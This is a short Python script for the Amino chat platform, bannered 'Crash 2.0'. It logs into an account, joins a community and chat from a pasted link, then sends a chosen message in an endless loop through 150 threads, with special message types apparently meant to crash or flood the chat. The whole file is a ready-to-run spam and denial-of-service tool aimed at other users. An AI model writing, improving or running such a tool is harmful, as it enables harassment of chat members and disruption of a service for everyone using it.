import amino
import concurrent.futures
import pyfiglet
from colored import fore, back, style, attr
attr(0)
print(fore.GREEN + style.BOLD)
print(pyfiglet.figlet_format(" R & P", font="graffiti"))
print(pyfiglet.figlet_format("Crash 2.0", font="small"))
client=amino.Client()
email = input("Email :- ")
password = input("password :- ")
client.login(email = email, password = password)
print("\nLogged in")
n=input("\033[1;32mEnter chat link :- ")
fok=client.get_from_code(n)
id=fok.objectId
comid=fok.path[1:fok.path.index("/")]
client.join_community(comId=comid)
print("\033[1;93mInside Community")
subclient=amino.SubClient(comId=comid,profile=client.profile)
subclient.join_chat(chatId=id)
print("\033[1;32mJoined the Chat")
msg = input("Message >> ")
print("msg type :- 0,108,109,110,56")
msgtype = input("Message Type >> ")
while True:
		print("Spamming...")
		with concurrent.futures.ThreadPoolExecutor(max_workers=150) as executor:
			_ = [executor.submit(subclient.send_message,id,msg, msgtype) for _ in range(100)]